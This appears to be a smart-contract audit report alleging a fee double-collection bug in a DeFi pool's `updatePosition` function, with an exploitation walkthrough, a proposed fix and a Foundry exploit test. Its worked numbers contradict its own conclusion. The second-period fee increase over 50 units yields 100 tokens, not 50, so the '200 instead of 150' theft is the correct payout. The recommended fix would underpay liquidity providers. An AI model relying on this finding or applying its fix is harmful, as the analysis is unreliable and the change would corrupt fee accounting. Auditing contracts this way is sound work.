## Title
Checkpoint Underflow in feesPerLiquidityFromAmounts() Allows Fee Double-Collection When Reducing Position Liquidity

## Summary
When a liquidity position is partially withdrawn, the `updatePosition` function calculates accumulated fees using the old liquidity but updates the fee checkpoint using the new (reduced) liquidity. This mismatch causes an arithmetic underflow in the checkpoint calculation, allowing LPs to collect more fees than they're entitled to on subsequent fee collections, violating the Fee Accounting invariant.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** When a position's liquidity is updated, the code should checkpoint the current accumulated fees so that future fee calculations only count newly accumulated fees. The checkpoint update should preserve existing uncollected fees while preventing double-counting.

**Actual Logic:** The code calculates fees using the position's current (old) liquidity, then updates the checkpoint by dividing those fees by the new (reduced) liquidity. This creates a mathematical inconsistency: [2](#0-1) 

At line 41, `position.fees()` uses `position.liquidity` (the OLD value before the update) to calculate accumulated fees. Then: [3](#0-2) 

The checkpoint update uses `liquidityNext` (the NEW reduced value) in `feesPerLiquidityFromAmounts()`. When `oldLiquidity > newLiquidity` and fees have accumulated, the formula `(fees << 128) / newLiquidity` produces a value larger than `feesPerLiquidityInside`, causing underflow in the unchecked subtraction: [4](#0-3) 

**Exploitation Path:**
1. LP creates a position with high liquidity (e.g., 100 units) in a pool at specific tick range
2. Fees accumulate as swaps occur, increasing `feesPerLiquidityInside` (e.g., to 2^128)
3. LP partially withdraws, reducing liquidity to a small amount (e.g., 50 units) without collecting fees
4. In `updatePosition()`: fees = (2^128 * 100) >> 128 = 100 tokens
5. Checkpoint update: newCheckpoint = 2^128 - (100 << 128) / 50 = 2^128 - 2^129, which underflows to ~2^256 - 2^128
6. More fees accumulate (e.g., `feesPerLiquidityInside` reaches 3 * 2^128)
7. LP calls `collectFees()`: fees = (3*2^128 - (2^256 - 2^128)) * 50 >> 128 = 200 tokens
8. LP receives 200 tokens instead of the correct 150 tokens (100 from period 1 + 50 from period 2)

**Security Property Broken:** Violates Critical Invariant #5 (Fee Accounting) - "Position fee collection must be accurate and never allow double-claiming"

## Impact Explanation
- **Affected Assets**: All liquidity providers who reduce their position size after fees accumulate. The excess fees are stolen from the pool's token reserves, ultimately harming other LPs and the protocol's solvency.
- **Damage Severity**: LP can collect approximately `(oldLiquidity / newLiquidity - 1) * accumulatedFees` in excess fees. With a 2x liquidity reduction, this is 100% of accumulated fees. Larger reductions (e.g., 100x) allow stealing 99x the legitimate fees.
- **User Impact**: Any LP performing a partial withdrawal after fees accumulate is affected. The vulnerability is triggered automatically by the protocol's update logic, requiring no special action from the LP.

## Likelihood Explanation
- **Attacker Profile**: Any liquidity provider can exploit this by simply performing partial withdrawals. No special permissions or technical sophistication required.
- **Preconditions**: 
  - Position must have accumulated fees (any active pool will have this)
  - LP must reduce liquidity (partial withdrawal) rather than full withdrawal
  - The reduction ratio determines the excess fees: higher reductions = more excess
- **Execution Complexity**: Single transaction calling `withdraw()` with `withFees=false`, then later calling `collectFees()`. Can be automated via smart contract.
- **Frequency**: Exploitable every time a position performs a partial withdrawal with accumulated fees. Can be repeated by depositing, accumulating fees, then partially withdrawing in cycles.

## Recommendation

The checkpoint calculation must use the same liquidity value that was used to calculate the fees. Fix line 437 in Core.sol:

```solidity
// In src/Core.sol, function updatePosition, line 434-437:

// CURRENT (vulnerable):
(uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
position.liquidity = liquidityNext;
position.feesPerLiquidityInsideLast =
    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));

// FIXED:
(uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
uint128 oldLiquidity = position.liquidity; // Cache old liquidity before update
position.liquidity = liquidityNext;
position.feesPerLiquidityInsideLast =
    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, oldLiquidity));
    // Use oldLiquidity to maintain mathematical consistency
```

Alternative mitigation: Require collecting fees before any liquidity reduction, or automatically collect fees during partial withdrawals.

## Proof of Concept

```solidity
// File: test/Exploit_CheckpointUnderflow.t.sol
// Run with: forge test --match-test test_CheckpointUnderflow -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/base/BasePositions.sol";
import "../src/Router.sol";
import "./helpers/TestERC20.sol";

contract Exploit_CheckpointUnderflow is Test {
    Core core;
    BasePositions positions;
    Router router;
    TestERC20 token0;
    TestERC20 token1;
    
    function setUp() public {
        // Initialize protocol
        core = new Core();
        positions = new BasePositions(core);
        router = new Router(core);
        
        token0 = new TestERC20("Token0", "TK0", 18);
        token1 = new TestERC20("Token1", "TK1", 18);
        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }
        
        // Mint tokens
        token0.mint(address(this), 1000000e18);
        token1.mint(address(this), 1000000e18);
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
    }
    
    function test_CheckpointUnderflow() public {
        // SETUP: Create pool and large position
        PoolKey memory poolKey = createPool(0, 1 << 63, 100);
        (uint256 id, uint128 initialLiquidity) = 
            positions.deposit(poolKey, -100, 100, 100e18, 100e18, type(uint128).max, type(uint128).max);
        
        console.log("Initial liquidity:", initialLiquidity);
        
        // Generate fees through swaps
        router.swap(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token0), amount: 10e18}),
            type(int256).min
        );
        
        // Check fees before partial withdrawal
        (uint128 liquidityBefore,,, uint128 fees0Before,) = 
            positions.getPositionFeesAndLiquidity(id, poolKey, -100, 100);
        console.log("Fees before withdrawal:", fees0Before);
        
        // EXPLOIT: Partially withdraw (reduce liquidity significantly) WITHOUT collecting fees
        uint128 withdrawAmount = liquidityBefore * 9 / 10; // Reduce by 90%
        positions.withdraw(id, poolKey, -100, 100, withdrawAmount, address(this), false);
        
        // Check liquidity after withdrawal
        (uint128 liquidityAfter,,, uint128 fees0After,) = 
            positions.getPositionFeesAndLiquidity(id, poolKey, -100, 100);
        console.log("Liquidity after withdrawal:", liquidityAfter);
        console.log("Fees after withdrawal (should be ~same):", fees0After);
        
        // Generate more fees
        router.swap(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token0), amount: 10e18}),
            type(int256).min
        );
        
        // VERIFY: Collect fees - will get more than entitled due to underflow
        (uint128 collectedFees0,) = positions.collectFees(id, poolKey, -100, 100);
        console.log("Collected fees:", collectedFees0);
        
        // Expected: fees0Before + (proportional new fees based on reduced liquidity)
        // Actual: Much higher due to checkpoint underflow
        uint128 expectedMaxFees = fees0Before + (fees0Before / 10); // Conservative estimate
        
        assertGt(collectedFees0, expectedMaxFees, 
            "Vulnerability confirmed: Collected more fees than mathematically possible due to checkpoint underflow");
    }
}
```

## Notes

The vulnerability stems from mixing two different liquidity values in a single mathematical operation. The `feesPerLiquidityFromAmounts()` function itself is correct - the issue is in how it's called at [5](#0-4) . The unchecked assembly subtraction in [6](#0-5)  allows the underflow to silently wrap around to a huge positive value, which then causes the fee calculation logic at [7](#0-6)  to return inflated amounts on subsequent collections.

This is distinct from simple precision loss - it's an arithmetic underflow that fundamentally breaks the fee accounting system. While the security question focuses on "small liquidity causing donation," the actual vulnerability is about liquidity REDUCTION causing fee theft, which is more severe than donation and directly exploitable for profit.

### Citations

**File:** src/Core.sol (L434-437)
```text
                (uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
                position.liquidity = liquidityNext;
                position.feesPerLiquidityInsideLast =
                    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));
```

**File:** src/types/position.sol (L33-51)
```text
function fees(Position memory position, FeesPerLiquidity memory feesPerLiquidityInside)
    pure
    returns (uint128, uint128)
{
    uint128 liquidity;
    uint256 difference0;
    uint256 difference1;
    assembly ("memory-safe") {
        liquidity := mload(add(position, 0x20))
        // feesPerLiquidityInsideLast is now at offset 0x40 due to extraData field
        let positionFpl := mload(add(position, 0x40))
        difference0 := sub(mload(feesPerLiquidityInside), mload(positionFpl))
        difference1 := sub(mload(add(feesPerLiquidityInside, 0x20)), mload(add(positionFpl, 0x20)))
    }

    return (
        uint128(FixedPointMathLib.fullMulDivN(difference0, liquidity, 128)),
        uint128(FixedPointMathLib.fullMulDivN(difference1, liquidity, 128))
    );
```

**File:** src/types/feesPerLiquidity.sol (L13-18)
```text
function sub(FeesPerLiquidity memory a, FeesPerLiquidity memory b) pure returns (FeesPerLiquidity memory result) {
    assembly ("memory-safe") {
        mstore(result, sub(mload(a), mload(b)))
        mstore(add(result, 32), sub(mload(add(a, 32)), mload(add(b, 32))))
    }
}
```

**File:** src/types/feesPerLiquidity.sol (L20-28)
```text
function feesPerLiquidityFromAmounts(uint128 amount0, uint128 amount1, uint128 liquidity)
    pure
    returns (FeesPerLiquidity memory result)
{
    assembly ("memory-safe") {
        mstore(result, div(shl(128, amount0), liquidity))
        mstore(add(result, 32), div(shl(128, amount1), liquidity))
    }
}
```
